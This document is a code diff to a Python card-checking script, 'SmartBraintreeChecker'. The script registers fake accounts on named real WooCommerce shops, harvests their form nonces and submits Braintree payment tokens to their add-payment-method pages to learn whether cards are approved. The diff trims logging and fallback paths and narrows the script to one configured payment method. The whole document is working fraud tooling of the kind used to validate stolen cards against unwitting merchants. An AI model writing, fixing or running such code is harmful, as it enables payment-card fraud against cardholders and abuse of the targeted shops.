@@ -23,7 +23,7 @@ from faker import Faker
 import logging
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.WARNING)
 logger = logging.getLogger(__name__)
 
 # Initialize
@@ -75,7 +75,7 @@ KNOWN_CONFIGS = {
         'register_url': '/customer-account/?action=register',
         'address_url': '/customer-account/edit-address/billing/',
         'payment_url': '/customer-account/add-payment-method/',
-        'payment_method': 'wc_braintree_credit_card'  # Updated to match actual site
+        'payment_method': 'braintree_cc'
     },
     'assurancehomehealthcare.ca': {
         'register_url': '/my-account/',
@@ -197,30 +197,16 @@ class SmartBraintreeChecker:
     def extract_tokens(self, html):
         """Extract CSRF tokens from HTML"""
         tokens = {}
-        # Try WooCommerce nonces first
         patterns = {
             'register_nonce': r'name="woocommerce-register-nonce" value="([^"]+)"',
             'login_nonce': r'name="woocommerce-login-nonce" value="([^"]+)"',
             'edit_address_nonce': r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
             'add_payment_nonce': r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
-            'wc_braintree_nonce': r'name="wc_braintree_credit_card_nonce" value="([^"]+)"',  # Added
             'wp_referer': r'name="_wp_http_referer" value="([^"]+)"'
         }
         for key, pattern in patterns.items():
             match = re.search(pattern, html)
             tokens[key] = match.group(1) if match else None
-        
-        # Try User Registration plugin nonces if WooCommerce not found
-        if not tokens.get('register_nonce'):
-            ur_patterns = {
-                'ur_frontend_form_nonce': r'name="ur_frontend_form_nonce" value="([^"]+)"',
-                'ur-register-nonce': r'name="ur-register-nonce" value="([^"]+)"',
-                'ur-login-nonce': r'name="ur-login-nonce" value="([^"]+)"'
-            }
-            for key, pattern in ur_patterns.items():
-                match = re.search(pattern, html)
-                tokens[key] = match.group(1) if match else None
-        
         return tokens
     
     async def detect_braintree_config(self):
@@ -285,60 +271,25 @@ class SmartBraintreeChecker:
             
             html = None
             working_reg_url = None
-            last_error = None
-            last_html = None
             
             # Try each URL until we find one with a registration form
             for reg_url in reg_urls:
                 try:
                     success, test_html = await self.get_page(reg_url)
-                    if not success:
-                        last_error = f"HTTP Error: {test_html}"
-                        logger.debug(f"URL {reg_url} failed: {last_error}")
-                        continue
-                    
-                    # Log the full HTML response for debugging
-                    logger.info(f"=== HTML RESPONSE FROM {reg_url} ===")
-                    logger.info(f"Response length: {len(test_html)} characters")
-                    logger.info(f"Contains 'woocommerce-register-nonce': {'woocommerce-register-nonce' in test_html}")
-                    logger.info(f"Contains 'ur_frontend_form_nonce': {'ur_frontend_form_nonce' in test_html}")
-                    logger.info(f"Contains 'user-registration-form': {'user-registration-form' in test_html}")
-                    
-                    # Log first 500 characters for quick inspection
-                    logger.info(f"First 500 chars: {test_html[:500]}")
-                    
-                    last_html = test_html
-                    
-                    # Check for either WooCommerce or User Registration forms
-                    if 'woocommerce-register-nonce' in test_html or 'ur_frontend_form_nonce' in test_html or 'user-registration-form' in test_html:
+                    if success and 'woocommerce-register-nonce' in test_html:
                         html = test_html
                         working_reg_url = reg_url
                         logger.info(f"Found registration form at: {reg_url}")
                         break
-                    else:
-                        last_error = "No registration form found"
-                        logger.debug(f"URL {reg_url} has no registration form")
-                except Exception as e:
-                    last_error = f"Exception: {str(e)[:50]}"
-                    logger.debug(f"URL {reg_url} failed: {last_error}")
+                except:
                     continue
             
             if not html or not working_reg_url:
-                error_msg = f"Registration Form Not Found (404/No Nonce) - {last_error}"
-                logger.error(error_msg)
-                if last_html:
-                    logger.error(f"=== FULL HTML RESPONSE ===\n{last_html}")
-                return False, error_msg
+                return False, "No registration form found"
             
             tokens = self.extract_tokens(html)
-            register_nonce = tokens.get('register_nonce')
-            ur_frontend_form_nonce = tokens.get('ur_frontend_form_nonce')
-            
-            if not register_nonce and not ur_frontend_form_nonce:
-                error_msg = "Registration Form Not Found (404/No Nonce) - No registration token found"
-                logger.error(error_msg)
-                logger.error(f"=== FULL HTML RESPONSE ===\n{html}")
-                return False, error_msg
+            if not tokens.get('register_nonce'):
+                return False, "No registration token found"
             
             headers = self.base_headers.copy()
             headers.update({
@@ -347,38 +298,23 @@ class SmartBraintreeChecker:
                 'referer': working_reg_url
             })
             
-            # Build flexible registration form based on detected system
-            form_data = {}
+            # Build flexible registration form
+            form_data = {
+                'email': user_data['email'],
+                'woocommerce-register-nonce': tokens['register_nonce'],
+                '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
+                'register': 'Register'
+            }
             
-            if register_nonce:  # WooCommerce
-                form_data = {
-                    'email': user_data['email'],
-                    'woocommerce-register-nonce': register_nonce,
-                    '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
-                    'register': 'Register'
-                }
-                
-                # Check what fields are required in the form
-                if 'name="username"' in html or 'name="reg_username"' in html:
-                    form_data['username'] = user_data['email'].split('@')[0]
-                
-                if 'name="password"' in html or 'name="reg_password"' in html:
-                    form_data['password'] = user_data['password']
-                
-                if 'name="email_2"' in html:
-                    form_data['email_2'] = ''
+            # Check what fields are required in the form
+            if 'name="username"' in html or 'name="reg_username"' in html:
+                form_data['username'] = user_data['email'].split('@')[0]
             
-            else:  # User Registration plugin
-                form_data = {
-                    'user_email': user_data['email'],
-                    'ur_frontend_form_nonce': ur_frontend_form_nonce,
-                    'ur-register-nonce': tokens.get('ur-register-nonce', ''),
-                    'first_name': user_data['first_name'],
-                    'last_name': user_data['last_name'],
-                    'user_pass': user_data['password'],
-                    'user_confirm_pass': user_data['password'],
-                    'submit': 'Register'
-                }
+            if 'name="password"' in html or 'name="reg_password"' in html:
+                form_data['password'] = user_data['password']
+            
+            if 'name="email_2"' in html:
+                form_data['email_2'] = ''
             
             # Add WooCommerce attribution
             form_data.update({
@@ -397,9 +333,6 @@ class SmartBraintreeChecker:
                 result = await response.text()
                 final_url = str(response.url)
                 
-                # Log the result
-                logger.info(f"Registration result: {result[:200]}...")
-                
                 # Check multiple success indicators
                 if any(x in result for x in ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address']):
                     if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
@@ -416,9 +349,8 @@ class SmartBraintreeChecker:
                 return False, "Registration form submitted but no success confirmation"
                 
         except Exception as e:
-            error_msg = f"Registration Form Not Found (404/No Nonce) - {str(e)[:50]}"
-            logger.error(error_msg)
-            return False, error_msg
+            return False, f"Registration error: {str(e)[:50]}"
+
     
     async def update_billing_address(self, user_data):
         """Update billing address with auto-detection"""
@@ -432,8 +364,6 @@ class SmartBraintreeChecker:
             
             tokens = self.extract_tokens(html)
             if not tokens.get('edit_address_nonce'):
-                logger.error("No address token found")
-                logger.error(f"=== FULL HTML RESPONSE ===\n{html}")
                 return False, "No address token"
             
             headers = self.base_headers.copy()
@@ -509,23 +439,15 @@ class SmartBraintreeChecker:
                 html = await response.text()
                 final_url = str(response.url)
                 
-                # Log the payment page response
-                logger.info(f"=== PAYMENT PAGE RESPONSE ===")
-                logger.info(f"Response length: {len(html)} characters")
-                logger.info(f"Contains 'woocommerce-add-payment-method-nonce': {'woocommerce-add-payment-method-nonce' in html}")
-                logger.info(f"Contains 'braintree' indicators: {'braintree' in html.lower()}")
-                
                 # Check if redirected to login
                 if 'login' in final_url.lower() and 'add-payment' not in final_url.lower():
                     return None, None, "Requires authentication"
                 
                 # Extract tokens
                 tokens = self.extract_tokens(html)
-                add_payment_nonce = tokens.get('add_payment_nonce') or tokens.get('wc_braintree_nonce')
+                add_payment_nonce = tokens.get('add_payment_nonce')
                 
                 if not add_payment_nonce:
-                    logger.error("No payment nonce found")
-                    logger.error(f"=== FULL PAYMENT PAGE HTML ===\n{html}")
                     return None, None, "No payment nonce"
                 
                 # Try to extract embedded client token
@@ -648,51 +570,45 @@ class SmartBraintreeChecker:
                 'user-agent': self.base_headers['user-agent']
             }
             
-            # Try all payment methods in PAYMENT_METHODS
-            for payment_method in PAYMENT_METHODS:
-                try:
-                    # Build form data based on payment method type
-                    if payment_method == 'braintree_cc':
-                        data = {
-                            'payment_method': 'braintree_cc',
-                            'braintree_cc_nonce_key': payment_token,
-                            'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                            'braintree_cc_3ds_nonce_key': '',
-                            'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                            '_wp_http_referer': self.detected_config['payment_url'],
-                            'woocommerce_add_payment_method': '1'
-                        }
-                    else:
-                        data = {
-                            'payment_method': payment_method,
-                            f'wc-{payment_method}-card-type': 'visa',
-                            f'wc_{payment_method}_payment_nonce': payment_token,
-                            f'wc-{payment_method}-device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                            f'wc-{payment_method}-tokenize-payment-method': 'true',
-                            'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                            '_wp_http_referer': self.detected_config['payment_url'],
-                            'woocommerce_add_payment_method': '1'
-                        }
-                    
-                    encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
-                    
-                    async with self.session.post(
-                        f"{self.base_url}{self.detected_config['payment_url']}",
-                        headers=headers,
-                        data=encoded
-                    ) as response:
-                        html = await response.text()
-                        parsed = self.site_response(html)
-                        
-                        if 'approved' in parsed.lower() or 'success' in parsed.lower():
-                            return {'success': True, 'response': parsed, 'payment_method': payment_method}
-                        else:
-                            continue  # Try next payment method
-                    
-                except Exception as e:
-                    continue  # Try next payment method
+            payment_method = self.detected_config['payment_method']
             
-            return {'success': False, 'response': 'All payment methods failed'}
+            # Build form data based on payment method type
+            if payment_method == 'braintree_cc':
+                data = {
+                    'payment_method': 'braintree_cc',
+                    'braintree_cc_nonce_key': payment_token,
+                    'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                    'braintree_cc_3ds_nonce_key': '',
+                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                    '_wp_http_referer': self.detected_config['payment_url'],
+                    'woocommerce_add_payment_method': '1'
+                }
+            else:
+                data = {
+                    'payment_method': payment_method,
+                    f'wc-{payment_method}-card-type': 'visa',
+                    f'wc_{payment_method}_payment_nonce': payment_token,
+                    f'wc_{payment_method}_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                    f'wc-{payment_method}-tokenize-payment-method': 'true',
+                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                    '_wp_http_referer': self.detected_config['payment_url'],
+                    'woocommerce_add_payment_method': '1'
+                }
+            
+            encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
+            
+            async with self.session.post(
+                f"{self.base_url}{self.detected_config['payment_url']}",
+                headers=headers,
+                data=encoded
+            ) as response:
+                html = await response.text()
+                parsed = self.site_response(html)
+                
+                if 'approved' in parsed.lower() or 'success' in parsed.lower():
+                    return {'success': True, 'response': parsed}
+                else:
+                    return {'success': False, 'response': parsed}
         except Exception as e:
             return {'success': False, 'response': str(e)[:50]}
     
